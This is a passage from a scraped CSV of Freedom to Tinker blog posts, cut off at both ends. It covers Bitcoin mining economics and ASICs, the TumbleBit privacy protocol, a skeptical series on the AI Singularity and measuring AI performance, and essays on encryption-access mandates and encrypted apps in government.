puzzles? It turns out that Bitcoin automatically adjusts the difficulty of the puzzles, so that the total rate at which puzzles are solved, by all of the miners in the world put together, is some constant value R. So if there are N active miners, and each is solving P/G puzzles per second like our would-be miner, then the puzzle difficulty will be adjusted so that NP/G = R, which means that the puzzle difficulty G will be G = NP/R. What does this mean for our would-be miner? Plugging our calculated value for G back in to the profitability calculation, we get that mining is profitable if NP/R < PV/C, or equivalently if NC < RV. In other words, mining is profitable if the worldwide total being spent on mining (NC) is less than the worldwide total revenue being captured by miners (RV). As long as this is true, new miners will join, thereby increasing the left side of the inequality. The influx of miners will stop when the two sides are equal, NC=RV, so that in equilibrium the value of the resources spent on mining is exactly equal to the value of the Bitcoins it generates. What's interesting about this equilibrium is that it doesn't depend on how efficiently puzzles can be solved. So the arrival of new super-fast, super-efficient Bitcoin mining chips won't fundamentally change the economics of Bitcoin mining. Instead of devoting RV worth of resources to mining with one type of equipment, miners will switch to devoting RV worth of resources to mining with a different type of equipment. The switch might be a shock to some miners–especially those who have sunk-cost investments in previous generations of mining technology, but the dynamics of Bitcoin mining, and Bitcoins generally, won't change much. Or that's what a simple model tells us. If we make our model a bit more complicated–and arguably a bit more realistic–some interesting things start to happen. But that's a topic for a future post."
"401","2013-02-04","2023-03-24","https://freedom-to-tinker.com/2013/02/04/bitcoin-grows-up-gets-its-own-hardware/","The big news in the Bitcoin world is that there are several Bitcoin-mining ASICs (custom chips) already shipping or about to be launched. Avalon in particular has been getting some attention recently. Bitcoin mining moved long ago from CPUs to GPUs, but this takes it one step further. The expectation is that very soon most mining will be done by such specialized hardware; general-purpose machines will be too inefficient to be profitable. This development raises a whole host of interesting questions. First, if ASIC mining is indeed so much faster than any current method, and can recover the hardware cost in just a few days as claimed, why are the creators selling them, or even talking about them?! Why not keep the existence of these devices a secret and mine as much BTC as possible before the world catches on? After all, the costs of packaging and distribution will only decrease the margins. There are several possible explanations: Maybe the buyers are people who have lower electricity costs (which is a significant fraction of total cost of mining over say a two-year period). There is a claim in this thread that the creators of Avalon could only raise money for manufacturing by pre-selling the units. Another reason from Butterfly Labs, one of the ASIC companies: “we believe the best way to secure bitcoin and help it to succeed is to get as much product out to as many people as widely as possible. That makes it exceptionally difficult, if not impossible, for any individual, corporation or hostile government to destabilize and wreck Bitcoin from within.” This refers to the “51% attack.” Given the speed of the Avalon chip, for example, only about 300 would be needed to exceed the current hashrate of the Bitcoin network! None of these reasons are fully convincing to me. In fact, one of the companies, ASICMiner, decided to use their machines in-house for mining, and tried to raise capital for manufacturing by selling shares in the company via a Bitcoin stock exchange, with amusing results that you can read about in the same Bitcoin magazine article linked to above. The second question that comes to mind is: what does a dramatically better mining technology do to the value of Bitcoin? Note that it’s not like the market is being flooded with Bitcoins. All this horsepower doesn’t mean mining is happening any faster — the system automatically and continually adjusts the mining difficulty so that Bitcoins are produced globally at a constant rate. As a side effect, the amount of BTC that a person or entity can mine is determined not by their absolute computing power but by the fraction of global bitcoin mining resources that they control. My speculation is that the shift to ASIC is good news for Bitcoin’s price inasmuch as it is a signal that people are taking it seriously, just as the price spiked after a hacker demanded ransom in Bitcoin. The fact that these custom chips are useless for any other computing may be particularly meaningful here. News about ASICs has been coming out for the better part of a year; I wonder if it’s possible to see the effect of an individual piece of news on the price. The “uselessness” brings me to my third point: is there a way to re-design Bitcoin so that the proof-of-work computations have a useful side effect — say protein folding — in essence making Bitcoin mining a massive grid computing project? This has been proposed repeatedly on forums and in blog posts, but my intuition is that it is not possible, that proof-of-work derives its effectiveness precisely from its uselessness. That said, given how much electricity is being spent on Bitcoin mining, it would be good to have a definitive answer."
"402","2016-09-13","2023-03-24","https://freedom-to-tinker.com/2016/09/13/improving-bitcoins-privacy-and-scalability-with-tumblebit/","Last week we unveiled TumbleBit, a new anonymous payments scheme that addresses two major technical challenges faced by Bitcoin today: (1) scaling Bitcoin to meet increasing use, and (2) protecting the privacy of payments made via Bitcoin. Our proof-of-concept source code and a pre-print of the latest version of our paper were both posted online last week. In this post, I’ll walk through the motivation and the design of TumbleBit, and explain how it achieves the following three important features: TumbleBit works with today’s Bitcoin protocol. No changes to Bitcoin are required. TumbleBit payments are processed off of the Bitcoin blockchain, helping Bitcoin scale to higher transaction velocity and volume. Like Bitcoin’s on-blockchain transactions, the safety and security of payments sent via TumbleBit do not require trust in any third party. The TumbleBit payment hub can not steal a user’s Bitcoins. TumbleBit provides anonymity for its off-blockchain payments even against the TumbleBit service. The exact property we guarantee is unlinkability (as explained in detail below). Bitcoin Anonymity Concerns Bitcoin is the ultimate transparent currency. Each transaction reveals the value of bitcoin that was transferred, and the addresses (Bitcoin identities) of both the party transferring the payment and the party receiving the payment. Even worse, these transaction details are recorded in an immutable and massively-replicated ledger which can be read by anyone, i.e. Bitcoin’s blockchain. Feeding this concern is a burgeoning blockchain analytics and surveillance industry. This presents problems for businesses that want to use Bitcoin, but don’t want to open their books to competitors via the blockchain. It also presents problems for regular users. Much has been made of companies using social networking profiles to make employment decisions and a transparent currency would make this even worse. Just as common wisdom suggests users should be empowered to choose appropriate privacy settings on social networks, users also need to tools to that limit the exposure of their private financial and purchasing history on Bitcoin’s blockchain. Bitcoin Scalability Concerns Regarding scalability, Bitcoin faces a problem that many protocol designers only dream of having: too many users want to use it. “On Scaling Decentralized Blockchains (A Position Paper)” explains the issue as follows: “Today’s representative blockchain such as Bitcoin takes 10 min or longer to confirm transactions, achieves 7 transactions/sec maximum throughput. In comparison, a mainstream payment processor such as Visa credit card confirms a transaction within seconds, and processes 2000 transactions/sec on average, with a peak rate of 56,000 transactions/sec [11]. Clearly, a large gap exists between where Bitcoin is today, and the scalability of a mainstream payment processor.” Applying Metcalfe’s law to Bitcoin suggests that the more people who use Bitcoin the more useful Bitcoin becomes. Thus scalability both in terms of volume (how many transactions can be confirmed per second) and velocity (how long a transaction takes to be confirmed) are significant limiters of the utility of Bitcoin. How Does TumbleBit Work? TumbleBit is implemented as a layer built on top of Bitcoin, and thus is fully compatible with today’s Bitcoin protocol. (This is analogous to how Tor is built as a layer on top of IP.) TumbleBit payments are sent via an intermediary called the Tumbler. In our paper, we describe how the core TumbleBit protocol can be run in in two modes. The first mode is a classic Bitcoin tumbler (also called a mixing service). In this post I will only address the second mode, where TumbleBit is used as an unlinkable payment hub. A Bitcoin payment hub is a system that allows users to make off-blockchain transactions (via an intermediary, aka the payment hub) with the same level of security as on-blockchain transactions. Users join the payment hub by “opening a payment channel” that escrows bitcoins in an on-blockchain Bitcoin transaction. Next, users send payments to each other off-blockchain. These payments can be high volume and fast, because they are not subject to the time it takes to confirm transactions on Bitcoin’s blockchain. Finally, a user “closes its payment channel” via an on-blockchain transaction that reflects its new balance of bitcoins after all off-blockchain payments have been made. In order to provide anonymity, TumbleBit requires all its users to open payment channels (in the “Escrow Phase”) and to close their payment channels (in the “Cash-Out Phase”)*. These two TumbleBit phases are relatively slow, because they require each user to post on-blockchain Bitcoin transaction that takes about 10 minutes to be confirmed. However, between these two phases in the “Payment Phase” where users send fast off-blockchain payments. TumbleBit payments can complete in seconds, thus scaling the velocity of Bitcoin payments. Perhaps more importantly, off-blockchain TumbleBit payments do not take up space on Bitcoin’s blockchain. This allows Bitcoin to process many off-blockchain transactions for only two on-blockchain transactions (i.e. the transactions which open and close the payment channel), scaling the maximum transaction volume which Bitcoin can handle. Payment hubs have a long history in Bitcoin. TumbleBit’s main innovation is to provide unlinkability. Unlinkability is defined as follows. Informally, unlinkability ensures that no one can tell which payer (Alice) paid which payee (Bob) during the payment phase of TumbleBit. More formally, the amount of bitcoin each user escrowed on the blockchain during the Escrow Phase is public. The amount of bitcoin cashed-out by each user during the “Cash-Out Phase” is also public. Let an interaction graph be any mapping of payments from the payers using TumbleBit (Alice1, …, AliceN) to payees using TumbleBit (Bob1, …, BobM). An interaction graph is compatible if it explains the transfer of funds from TumbleBit’s “Escrow Phase” to TumbleBit’s “Cash-Out Phase”. Unlinkability requires all compatible interaction graphs to be equally likely. TumbleBit payments are unlinkable because the TumbleBit protocol ensures that all compatible interaction graphs are equally likely. The anonymity provided by TumbleBit grows with the number of compatible interaction graphs. To achieve unlinkability without compromising the security and safety of Bitcoin payments, TumbleBit must also ensure that the hub can’t steal bitcoins from the users or “print money” for itself. To do this, TumbleBit uses two interleaved protocols, the puzzle-promise-protocol and the RSA-puzzle-solver protocol. I give a brief overview of each protocol here. Our paper has the full details. TumbleBit Walk-Through TumbleBit replaces on-blockchain payments with off-blockchain puzzle solving, where Alice pays Bob by providing Bob with the solution to a puzzle. The puzzle is generated through interaction between Bob and the Tumbler (the puzzle-promise protocol) solved through an interaction between Alice and the Tumbler (the puzzle-solver protocol). Each time a puzzle is solved, 1 bitcoin is transferred from Alice to the Tumbler and each time Bob learns a solution 1 bitcoin is transferred from the Tumbler to Bob. A TumbleBit puzzle z is simply an RSA evaluation of its solution value ϵ under the RSA public key (pk, N) of the Tumbler, ie z = ϵᵖᵏ mod N In the puzzle-promise protocol, Bob is convinced that he has received an valid puzzle $z$, and that the solution to this puzzle will allow Bob to increase the value of his escrow by 1 bitcoin. The puzzle-solver protocol allows the Tumbler to take 1 Bitcoin from Alice’s escrow if and only if the hub reveals the solution to an RSA-puzzle of Alice’s choice. Putting these two protocols together, Alice can buy puzzle solutions from the Tumbler using the puzzle-solver protocol, which is a cryptographically-enforced fair exchange where 1 Bitcoin (from Alice) is exchanged for 1 puzzle solution (from the Tumbler). By purchasing a solution to Bob’s puzzle, Alice in essence pays 1 Bitcoin to Bob via the Tumbler. Naturally, if Alice gives the Tumbler the exact same puzzle that Bob got from the Tumbler, the Tumbler will know Alice is paying Bob. To solve this problem, we borrow a technique called RSA blinding from Chaum’s original eCash paper ‘Blind Signatures for Untraceable Payments’. Bob blinds the puzzle (by multiplying it with a random value) before sending it to Alice. This way, no one other than Alice and Bob, not even the Tumbler can link Bob’s (unblinded) puzzle to (blinded) puzzle that Alice will pay the Tumbler to solve. This blinding is information theoretically secure. When Bob receives the solution to the blinded puzzle, he can unblind it and learn the solution to the original RSA puzzle which the Tumbler issued to him. This allows Alice to pay Bob by paying the Tumbler for a solution to a blinded RSA puzzle without revealing to the Tumbler which puzzle is being solved. All the Tumbler observes is Alice buying solutions to random puzzles that the Tumbler never issued. Thus, the Tumbler can not link the solution to any puzzle to an issued puzzle. The Future of the TumbleBit Project TumbleBit is a rapidly evolving project. We are currently developing our proof of concept implementation into production ready software, adding increased functionality into our core protocols and exploring new applications. A major milestone for our protocol was using our proof of concept TumbleBit implementation (available on github) to perform a test of TumbleBit protocol on Bitcoin’s blockchain tumbling 800 Bitcoin addresses to 800 new Bitcoin addresses. Having demonstrated that TumbleBit works at scale on today’s Bitcoin, our next goal is to develop TumbleBit into software the average Bitcoin user can use to protect their privacy when paying with Bitcoin (see our software roadmap on github). We are also working to improve our protocols and find new uses for them. In the current TumbleBit protocol, all payments must be of the same domination. If this domination is set to 0.01 Bitcoin, and Alice wants to pay Bob 0.05 she needs to make five payments. At the moment we are exploring extensions to our protocols to allow for TumbleBit payments of arbitrary denominations while still providing unlinkability. We are also exploring other applications for TumbleBit, like increasing the privacy of the Lightning Network or performing unlinkable cross-chain trading. * TumbleBit is currently a unidirectional payment hub: each payment channel can either send funds or receive funds. Users who wish to do both must open two distinct TumbleBit payment channels."
"403","2018-10-18","2023-03-24","https://freedom-to-tinker.com/2018/10/18/citp-to-launch-tech-policy-clinic-hiring-clinic-lead/","We’re excited to announce the CITP technology policy clinic, a first-of-its-kind interdisciplinary project to engage students and scholars directly in the policy process. The clinic will be supported by a generous alumni gift. The technology policy clinic will adapt the law school clinic model to involve scholars at all levels in real-world policy activities related to technology—preparing written comments and briefs, working with startup companies, and collaborating with public-interest law groups. As an outgrowth of this work, CITP could provide federal, state and local policy makers with briefings on emerging technologies and could also create simple non-partisan guides to action for citizens and small businesses. We’re looking to hire a Clinic Lead, an experienced policy professional to lead the clinic. For more information, go to https://citp.princeton.edu/clinic-lead/ CITP was founded as Princeton’s initiative to support research and education on technology policy issues. Over the years, CITP’s voice grew stronger as it uniquely leveraged its strength of world class computer scientists and engineers, to work alongside leading policy experts at the Woodrow Wilson School of Public Policy. The center has now established a recognized national voice in areas including AI policy, privacy and security, technology for governance and civil liberties, broadband policy, big data, cryptocurrencies, and the internet of things. As the national debate over technology and its impact on democracy has come to the forefront in recent times, the demand for technology policy experts has surged. CITP recognizes a need to take on a larger role in tackling some of these technology policy problems by providing on-the-ground training to Princeton’s extraordinary students. We’re eager to hire a Clinic Lead and get started!"
"404","2018-01-10","2023-03-24","https://freedom-to-tinker.com/2018/01/10/singularity-skepticism-4-the-value-of-avoiding-errors/","[This is the fourth in a series of posts. The other posts in the series are here: 1 2 3.] In the previous post, we did a deep dive into chess ratings, as an example of a system to measure a certain type of intelligence. One of the takeaways was that the process of numerically measuring intelligence, in order to support claims such as “intelligence is increasing exponentially”, is fraught with complexity. Today I want to wrap up the discussion of quantifying AI intelligence by turning to a broad class of AI systems whose performance is measured as an error rate, that is, the percentage of examples from population for which the system gives a wrong answer. These applications include facial recognition, image recognition, and so on. For these sorts of problems, the error rate tends to change over time as shown on this graph: The human error rate doesn’t change, but the error rate for the AI system tends to fall exponentially, crossing the human error rate at a time we’ll call t*, and continuing to fall after that. How does this reduction in error rate translate into outcomes? We can get a feel for this using a simple model, where a wrong answer is worth W and a right answer is worth R, with R>W, naturally. In this model, the value created per decision changes over time as shown in this graph: Before t*, humans perform better, and the value is unchanged. At t*, AI becomes better and the graph takes a sharp turn upward. After that, the growth slows as the value approaches its asymptote of R. This graph has several interesting attributes. First, AI doesn’t help at all until t*, when it catches up with people. Second, the growth rate of value (i.e., the slope of the curve) is zero while humans are better, then it lurches upward at t*, then the growth rate falls exponentially back to zero. And third, most of the improvement that AI can provide will be realized in a fairly short period after t*. Viewed over a long time-frame, this graph looks a lot like a step function: the effect of AI is a sudden step up in the value created for this task. The step happens in a brief interval after AI passes human performance. Before and after that interval, the value doesn’t change much at all. Of course, this simple model can’t be the whole story. Perhaps a better solution to this task enables other tasks to be done more effectively, multiplying the improvement. Perhaps people consume more of this tasks’s output because it is better. For these and other reasons, things will probably be somewhat better than this model predicts. But the model is still a long way from establishing that any kind of intelligence explosion or Singularity is going to happen. Next time, we’ll dive into the question of how different AI tasks are connected, and how to think about the Singularity in a world where task-specific AI is all we have."
"405","2018-01-08","2023-03-24","https://freedom-to-tinker.com/2018/01/08/singularity-skepticism-3-how-to-measure-ai-performance/","[This is the third post in a series. The other posts are here: 1 2 4] On Thursday I wrote about progress in computer chess, and how a graph of Elo rating (which I called the natural measure of playing skill) versus time showed remarkably consistent linear improvement over several decades. I used this to argue that sometimes exponential improvements in the inputs to AI systems (computer speed and algorithms) lead to less-than-exponential improvement in AI performance. Readers had various objections to this. Some said that linear improvements in Elo rating should really be seen as exponential improvements in quality; and some said that the arrival of the new AI program AlphaZero (which did not appear in my graph and was not discussed in my post) is a game-changer that invalidates my argument. I’ll address those objections in this post. First, let’s talk about how we measure AI performance. For chess, I used Elo rating, which is defined so that if Player A has a rating 100 points higher than Player B, we should expect A to collect 64% of the points when playing B. (Winning a game is one point, a drawn game is half a point for each player, and losing gets you zero points.) There is an alternative rating system, which I’ll call ExpElo, which turns out to be equivalent to Elo in its predictions. Your ExpElo rating is determined by exponentiating your Elo rating. Where Elo uses the difference of two player’s ratings to predict win percentage, ExpElo uses a ratio of the ratings. Both Elo and ExpElo are equally compelling from an abstract mathematical standpoint, and they are entirely equivalent in their predictions. But where a graph of improvement in Elo is linear, a graph of improvement in ExpElo would be exponential. So is the growth in chess performance linear or exponential? Before addressing that question, let’s stop to consider that this situation is not unique to chess. Any linearly growing metric can be rescaled (by exponentiating the metric) to get a new metric that grows exponentially. And any exponentially growing metric can be rescaled (by taking the logarithm) to get a new metric that grows linearly. So for any quantity that is improving, we will always be able to choose between a metric that grows linearly and one that grows exponentially. The key question for thinking about AI is: which metric is the most natural measure of what we mean by intelligence on this particular task? For chess, I argue that this is Elo (and not ExpElo). Long before this AI debate, Arpad Elo proposed the Elo system and that was the one adopted by chess officials. The U.S. Chess Federation divides players into skill classes (master, expert, A, B, C, and so on) that are evenly spaced, 200 Elo points wide. For classifying human chess performance, Elo was chosen. So why should we switch to a different metric for thinking about AI? Now here’s the plot twist: the growth in computer chess rating, whether Elo or ExpElo, is likely to level off soon, because the best computers seem to be approaching perfect play, and you can’t get better than perfect. In every chess position, there is some move (or moves) that is optimal, in the sense of leading to the best possible game outcome. For an extremely strong player, we might ask what that player’s error rate is: in high-level play, for what fraction of the positions it encounters will it make a non-optimal move? Suppose a player, Alice, has an error rate of 1%, and suppose (again to simplify the explanation) that a chess game lasts fifty moves for each player. Then in the long run Alice will make a non-optimal move once every two games–in half of the games she will play optimally. This implies that if Alice plays a chess match against God (who always makes optimal moves), Alice will get at least 25% of the points, because she will play God evenly in the half of games where she makes all optimal moves, and (worst case) she will lose the games where she errs. And if Alice can score at least 25% against God, then Alice’s Elo rating is no more than 200 points below God’s. The upshot is that there is some rating–the “Rating of God”–that cannot be exceeded, and that is true in both Elo and ExpElo systems. Clever research by Ken Regan and others has shown that the best chess programs today have fairly low error rates and therefore are approaching the Rating of God. Regan’s research suggests that the RoG is around 3600, which is notable because the best program on my graph, Stockfish, is around 3400, and AlphaZero, the new AI chess player from Google’s DeepMind, may be around 3500. If Regan’s estimate is right, then AlphaZero is playing the majority of its games optimally and would score about 36% against God. The historical growth rate of AI Elo ratings has been about 50 points per year, so it would appear that growth can continue for only a couple of years before leveling off. Whether the growth in chess performance has been linear or exponential so far, it seems likely to flatline within a few years."
"406","2018-01-04","2023-03-24","https://freedom-to-tinker.com/2018/01/04/singularity-skepticism-2-why-self-improvement-isnt-enough/","[This is the second post in a series. The other posts are here: 1 3 4] Yesterday, I wrote about the AI Singularity, and why it won’t be a literal singularity, that is, why the growth rate won’t literally become infinite. So if the Singularity won’t be a literal singularity, what will it be? Recall that the Singularity theory is basically a claim about the growth rate of machine intelligence. Having ruled out the possibility of faster-than-exponential growth, the obvious hypothesis is exponential growth. Exponential growth doesn’t imply that any “explosion” will occur. For example, my notional savings account paying 1% interest will grow exponentially but I will not experience a “wealth explosion” that suddenly makes me unimaginably rich. But what if the growth rate of the exponential is much higher? Will that lead to an explosion? The best historical analogy we have is Moore’s Law. Over the past several decades computing power has growth exponentially at a 60% annual rate–or a doubling time of 18 months–leading to a roughly ten-billion-fold improvement. That has been a big deal, but it has not fundamentally changed the nature of human existence. The effect of that growth on society and the economy has been more gradual. The reason that a ten-billion-fold improvement in computing has not made us ten billion times happier is obvious: computing power is not something we value deeply for its own sake. For computing power to make us happier, we have to find ways to use computing to improve the things we do care mostly deeply about–and that isn’t easy. More to the point, efforts to turn computing power into happiness all seem to have sharply diminishing returns. For example, each new doubling in computing power can be used to improve human health, by finding new drugs, better evaluating medical treatments, or applying health interventions more efficiently. The net result is that health improvement is more like my savings account than like Moore’s Law. Here’s an example from AI. The graph below shows improvement in computer chess performance from the 1980s up to the present. The vertical axis shows Elo rating, the natural measure of chess-playing skill, which is defined so that if A is 100 Elo points above B, then A is expected to beat B 64% of the time. (source: EFF) The result is remarkably linear over more than 30 years, despite exponential growth in underlying computing capacity and similar exponential growth in algorithm performance. Apparently, rapid exponential improvements in the inputs to AI chess-playing lead to merely linear improvement in the natural measure of output. What does this imply for the Singularity theory? Consider the core of the intelligence explosion claim. Quoting Good’s classic paper: … an ultraintelligent machine could design even better machines; there would then unquestionably be an ‘intelligence explosion,’ … What if “designing even better machines” is like chess, in that exponential improvements in the input (intelligence of a machine) lead to merely linear improvements in the output (that machine’s performance at designing other machines)? If that were the case, there would be no intelligence explosion. Indeed, the growth of machine intelligence would be barely more than linear. (For the mathematically inclined: if we assume the derivative of intelligence is proportional to log(intelligence), then intelligence at time T will grow like T log(T), barely more than linear in T.) Is designing new machines like chess in this way? We can’t know for sure. It’s a question in computational complexity theory, which is basically the study of how much more of some goal can be achieved as computational resources increase. Having studied complexity theory more deeply than most humans, I find it very plausible that machine design will exhibit the kind of diminishing returns we see in chess. Regardless, this possibility does cast real doubt on Good’s claim that self-improvement leads “unquestionably” to explosion. So Singularity theorists have the burden of proof to explain why machine design can exhibit the kind of feedback loop that would be needed to cause an intelligence explosion. In the next post, we’ll look at another challenge faced by Singularity theorists: they have to explain, consistently with their other claims, why the Singularity hasn’t happened already. [Update (Jan. 8, 2018): The next post responds to some of the comments on this one, and gives more detail on how to measure intelligence in chess and other domains. I’ll get to that other challenge to Singularity theorists in a subsequent post.]"
"407","2018-01-03","2023-03-24","https://freedom-to-tinker.com/2018/01/03/why-the-singularity-is-not-a-singularity/","This is the first in a series of posts about the Singularity, that notional future time when machine intelligence explodes in capability, changing human life forever. Like many computer scientists, I’m a Singularity skeptic. In this series I’ll be trying to express the reasons for my skepticism–and workshopping ideas for an essay on the topic that I’m working on. Your comments and feedback are even more welcome that usual! [Later installments in the series are here: 2 3 4] What is the Singularity? It is a notional future moment when technological change will be so rapid that we have no hope of understanding its implications. The Singularity is seen as a cultural event horizon beyond which humanity will become … something else that we cannot hope to predict. Singularity talk often blends into theories about future superintelligence posing an existential risk to humanity. The essence of Singularity theory was summarized in an early (1965) paper by the British mathematician I.J. Good: Let an ultraintelligent machine be defined as a machine that can far surpass all the intellectual activities of any man however clever. Since the design of machines is one of these intellectual activities, an ultraintelligent machine could design even better machines; there would then unquestionably be an ‘intelligence explosion,’ and the intelligence of man would be left far behind. Thus the first ultraintelligent machine is the last invention that man need ever make, provided that the machine is docile enough to tell us how to keep it under control. Vernor Vinge was the first to describe this as a “singularity”, adopting a term from mathematics that applies when the growth rate of a quantity goes to infinity. The term was further popularized by Ray Kurzweil’s book, “The Singularity is Near.” Exponential Growth The Singularity theory is fundamentally a claim about the future growth rate of machine intelligence. Before evaluating that claim, let’s first review some concepts useful for thinking about growth rates. A key concept is exponential growth, which means simply that the increase in something is proportional to how big that thing already is. For example, if my bank account grows at 1% annually, this means that the every year the bank will add to my account 1% of the current balance. That’s exponential growth. Exponential growth can happen at different speeds. There are two natural ways to characterize the speed of exponential growth. The first is a growth rate, typically stated as a percentage per some time unit. For example, my notional bank account has a growth rate of 1% per year. The second natural measure is the doubling time–how long it will take the quantity to double. For my bank account, that works out to about 70 years. A good way to tell if a quantity is growing exponentially is to look at how its growth is measured. If the natural measure is a growth rate in percent per time, or a doubling time, then that quantity is growing exponentially. For example, economic growth in most countries is measured as a percent increase in (say) GDP, which tells us that GDP tends to grow exponentially over the long term–with short-term ups and downs, of course. If a country’s GDP is growing at 3% per year, that corresponds to a doubling time of about 23 years. Exponential growth is very common in nature and in human society. So the fact that a quantity is growing exponentially does not in itself make that quantity special nor does it give that quantity unusual, counterintuitive dynamics. The speed and capacity of computers has grown exponentially, which is not remarkable. What is remarkable is the growth rate in computing capacity. A rule of thumb called “Moore’s Law” states that the speed and capacity of computers will have a doubling time of 18 months, which corresponds to a growth rate of 60% per year. Moore’s Law has held true for roughly fifty years–that’s 33 doublings, or roughly a ten-billion-fold increase in capacity. The Singularity is Not a Literal Singularity As a first step in considering the plausibility of the Singularity hypothesis, let’s consider the prospect of a literal singularity–where the rate of improvement in machine intelligence literally becomes infinite at some point in the future. This requires that machine intelligence grows faster than any exponential, so that the doubling time gets smaller and smaller, and eventually goes to zero. I don’t know of any theoretical basis for expecting a literal singularity. There is virtually nothing in the natural or human world that grows super-exponentially over time–and even “ordinary” super-exponential growth does not yield a literal singularity. In short, it’s hard to see how the AI “Singularity” could possibly be a true mathematical singularity. So if the Singularity is not literally a singularity, what is it? The next post will start with that question."
"408","2017-05-04","2023-03-24","https://freedom-to-tinker.com/2017/05/04/multiple-intelligences-and-superintelligence/","Superintelligent machines have long been a trope in science fiction. Recent advances in AI have made them a topic for nonfiction debate, and even planning. And that makes sense. Although the Singularity is not imminent–you can go ahead and buy that economy-size container of yogurt–it seems to me almost certain that machine intelligence will surpass ours eventually, and quite possibly within our lifetimes. Arguments to the contrary don’t seem convincing. Kevin Kelly’s recent essay in Backchannel is a good example. His subtitle, “The AI Cargo Cult: The Myth of a Superhuman AI” implies that AI of superhuman intelligence will not occur. His argument centers on five “myths”: Artificial intelligence is already getting smarter than us, at an exponential rate. We’ll make AIs into a general purpose intelligence, like our own. We can make human intelligence in silicon. Intelligence can be expanded without limit. Once we have exploding superintelligence it can solve most of our problems. He rebuts these “myths” with five “heresies” : Intelligence is not a single dimension, so “smarter than humans” is a meaningless concept. Humans do not have general purpose minds, and neither will AIs. Emulation of human thinking in other media will be constrained by cost. Dimensions of intelligence are not infinite. Intelligences are only one factor in progress. This is all fine, but notice that even if all five “myths” are false, and all five “heresies” are true, superintelligence could still exist. For example, superintelligence need not be “like our own” or “human” or “without limit”–it only needs to outperform us. The most interesting item on Kelly’s lists is heresy #1, that intelligence is not a single dimension, so “smarter than humans” is a meaningless concept. This is really two claims, so let’s consider them one at a time. First, is intelligence a single dimension, or are there different aspects or skills involved in intelligence? This is an old debate in human psychology, on which I don’t have an informed opinion. But whatever the nature and mechanisms of human intelligence might be, we shouldn’t assume that machine intelligence will be the same. So far, AI practice has mostly treated intelligence as multi-dimensional, building distinct solutions to different cognitive challenges. Perhaps this is fundamental, and machine intelligence will always be a bundle of different capabilities. Or perhaps there will be a future unification of some sort, to create a single capability that can outperform people on all or nearly all cognitive tasks. At this point it seems like an open question whether machine intelligence is inherently multi-dimensional. The second part of Kelly’s claim is that, assuming intelligence is multi-dimensional, “smarter than humans” is a meaningless concept. This, to put it bluntly, is not correct. To see why, consider that playing center field in baseball requires multi-dimensional skills: running, throwing, distinguishing balls from strikes, hitting accurately, hitting with power, and so on. Yet every single major league center fielder is vastly better than I am at playing center field, because they dominate me by far in every one of the component skills. Like playing center field, intelligence may be multi-dimensional, and yet one entity can be more intelligent than another by being superior in every dimension. What this suggests about the future of machine intelligence is that we may live for quite a while in a state where machines are better than us at some aspects of intelligence and we are better than them at others. Indeed, that is the case now, and has been for years. If machine intelligence remains multi-dimensional, then machines will surpass our intelligence not at a single point in time, but gradually, and in more and more dimensions of intelligence."
"409","2017-03-27","2023-03-24","https://freedom-to-tinker.com/2017/03/27/how-to-analyze-an-encryption-access-proposal/","It looks like the idea of requiring law enforcement access to encrypted data is back in the news, with the UK government apparently pushing for access in the wake of the recent London attack. With that in mind, let’s talk about how one can go about analyzing a proposed access mandate. The first thing to recognize is that although law enforcement is often clear about what result they want–getting access to encrypted data–they are often far from clear about how they propose to get that result. There is no magic wand that can give encrypted data to law enforcement and nobody else, while leaving everything else about the world unchanged. If a mandate were to be imposed, this would happen via regulation of companies’ products or behavior. The operation of a mandate would necessarily be a three stage process: the government imposes specific mandate language, which induces changes in product design and behavior by companies and users, thereby leading to consequences that affect the public good. Expanding this a bit, we can lay out some questions that a mandate proposal should be prepared to answer: mandate language: What requirements are imposed, and on whom? Which types of devices and products are covered and which are not? What specifically is required of a device maker? Of an operating system developer? Of a network provider? Of a retailer selling devices? Of an importer of devices? Of a user? changes in product design and behavior: How will companies and users react to the mandate? For example, how will companies change the design of their products to comply with the mandate while maintaining their competitive position and serving their customers? How will criminals and terrorists change their behavior? How will law-abiding users adapt? What might foreign governments do to take advantage of these changes? consequences: What consequences will result from the design and behavioral changes that are predicted? How will the changes affect public safety? Cybersecurity? Personal privacy? The competitiveness of domestic companies? Human rights and free expression? These questions are important because they expose the kinds of tradeoffs that would have to be made in imposing a mandate. As an example, covering a broad range of devices might allow recovery of more encrypted data (with a warrant), but it might be difficult to write requirements that make sense across a broad spectrum of different device types. As another example, all of the company types that you might regulate come with challenges: some are mostly located outside your national borders, others lack technical sophistication, others touch only a subset of the devices of interest, and so on. Difficult choices abound–and if you haven’t thought about how you would make those choices, then you aren’t in a position to assert that the benefits of a mandate are worth the downsides. To date, the FBI has not put forward any specific approach. Nor has the UK government, to my knowledge. All they have offered in their public statements are vague assertions that a good approach must exist. If our law enforcement agencies want to have a grown-up conversation about encryption mandates, they can start by offering a specific proposal, at least for purposes of discussion. Then the serious policy discussion can begin."
"410","2017-02-27","2023-03-24","https://freedom-to-tinker.com/2017/02/27/on-encryption-apps-in-the-white-house/","Politico ran a long story today pointing to an increase in the use of encrypted communication apps by people in DC, government, and the White House specifically. Poisonous political divisions have spawned an encryption arms race across the Trump administration, as both the president’s advisers and career civil servants scramble to cover their digital tracks in a capital nervous about leaks. The surge in the use of scrambled-communication technology — enabled by free smartphone apps such as WhatsApp and Signal — could skirt or violate laws that require government records to be preserved and the public’s business to be conducted in official channels, several ethics experts say. It may even cloud future generations’ knowledge of the full history of Donald Trump’s presidency. The article seems to be well reported, and it raises some of the important issues around the trend toward encryption in DC. But I think it misses a few points, which I’d like to open up in this post. The first point is that there is nothing wrong with government employees using encrypted apps for their personal communication. Indeed, doing so should be considered a best practice for people who might be targets for foreign intelligence services–such as people who work at the White House. Insecure practices in the personal lives of government officials create risk–and it seems ill-advised for White House officials to try to stop their employees from following security best practices on their personal phones. The second issue is the relationship between encryption and record-keeping. Government employees are required to retain records of much of their official communication–which is one of the reasons why business and personal activities are conducted on separate systems, more so in the government than in other enterprises. (The other main reason is security. And of course classified information is handled on yet another separate array of systems.) Government systems are set up to collect the necessary records, whereas your personal systems probably don’t retain everything that you would need to keep if you were carrying out government business on them. But notice that record-keeping does not depend on messages being encrypted or not encrypted as they traverse a network. It is perfectly feasible to transmit a message in encrypted form, while archiving that message at one or both endpoints. If you’re using an untrusted network–and most of the networks you’ll encounter as you move through your life should be treated as untrusted–then it’s prudent to use encryption for data traversing those networks, and to meet any record-keeping requirement by logging messages at the endpoints. Some government-issued systems already work that way. But the reality for White House employees–based on my experience working there–is that they seem to have access to better encrypted communication tools on their private devices than they do on their government-issue devices. And that leads to a natural temptation to transact government business using secure apps on personal devices. One 